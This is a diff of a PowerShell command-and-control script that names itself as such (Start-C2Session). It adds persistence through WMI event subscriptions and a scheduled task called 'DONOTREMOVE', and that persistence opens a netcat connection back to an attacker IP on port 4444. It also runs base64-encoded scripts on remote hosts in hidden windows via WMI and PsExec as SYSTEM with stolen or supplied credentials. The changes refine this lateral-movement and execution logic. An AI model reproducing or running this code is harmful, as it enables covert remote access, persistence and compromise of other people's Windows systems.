@@ -95,7 +95,6 @@ function Execute-InteractivePSRemoting {
     Remove-PSSession -Session $session
 }
 
-
 $scriptBlock = {
     param ($attackerIP)
     function Enable-PSRemotingAndWinRM {
@@ -128,7 +127,7 @@ $scriptBlock = {
     function Setup-TaskSchedulerPersistence {
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name='DCOMServerProcessLauncher', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''; wmic /NAMESPACE:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name='DCOMServerProcessLauncher', ExecutablePath='C:\\Windows\\System32\\DONOTREMOVE.exe', CommandLineTemplate='C:\\Windows\\System32\\DONOTREMOVE.exe nc $attackerIP 4444'; wmic /NAMESPACE:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=""DCOMServerProcessLauncher""', Consumer='CommandLineEventConsumer.Name=""DCOMServerProcessLauncher""'`""
         $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Days 99)
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        $principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
         $settings = New-ScheduledTaskSettingsSet
         $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
         Register-ScheduledTask -TaskName "DONOTREMOVE" -InputObject $task
@@ -145,29 +144,26 @@ function Execute-Scripts {
         [string]$User,
         [string]$Password
     )
-
+    $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+    $credential = New-Object System.Management.Automation.PSCredential($User, $securePassword)
     if (-not (Test-Path $localDir)) {
         Write-Host "The directory $localDir does not exist. Please check the path."
         return
     }
-
     Get-ChildItem -Path $localDir -Filter "*.ps1" | ForEach-Object {
         $scriptPath = $_.FullName
-        Write-Host "Executing script: $scriptPath"
-        
+        Write-Host "Preparing to execute script remotely: $scriptPath"
         try {
             $scriptContent = Get-Content -Path $scriptPath -Raw
             $scriptBytes = [System.Text.Encoding]::Unicode.GetBytes($scriptContent)
             $encodedScript = [Convert]::ToBase64String($scriptBytes)
-            
-            $command = "powershell.exe -EncodedCommand $encodedScript -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden"
-            
-            Invoke-CimMethod -ComputerName $ComputerName -Namespace root\cimv2 -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command} -Credential (New-Object System.Management.Automation.PSCredential($User, (ConvertTo-SecureString $Password -AsPlainText -Force)))
+            $psexecCommand = "C:\pushsys\PsExec.exe -s powershell.exe -EncodedCommand $encodedScript -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden"
+            Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName $ComputerName -Namespace "root\cimv2" -Credential $credential -ArgumentList $psexecCommand
 
-            Write-Host "Successfully executed $scriptPath"
+            Write-Host "Successfully triggered PsExec on remote machine to execute $scriptPath as SYSTEM."
         }
         catch {
-            Write-Host "Failed to execute ${scriptPath}: $_"
+            Write-Host "Failed to execute script on remote machine: $scriptPath. Error: $_"
         }
     }
 }
@@ -194,9 +190,9 @@ function Start-C2Session {
             try {
                 Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName $target -Credential $credential -ArgumentList $command
                 Write-Host "Executing scripts on $target..."
+                PushPull-System-PSRemoting -target $target -user $user -password $password
                 Execute-Scripts -ComputerName $target -User $user -Password $password
                 Write-Host "Successfully executed on $target"
-                PushPull-System-PSRemoting -target $target -user $user -password $password
                 Write-Host "`Starting interactive session with $target..."
                 Execute-InteractivePSRemoting -ComputerName $target -User $user -Password $password
             }
@@ -209,7 +205,6 @@ function Start-C2Session {
         Write-Host "Seed data not found."
     }
 }
-
 
 Start-C2Session
 
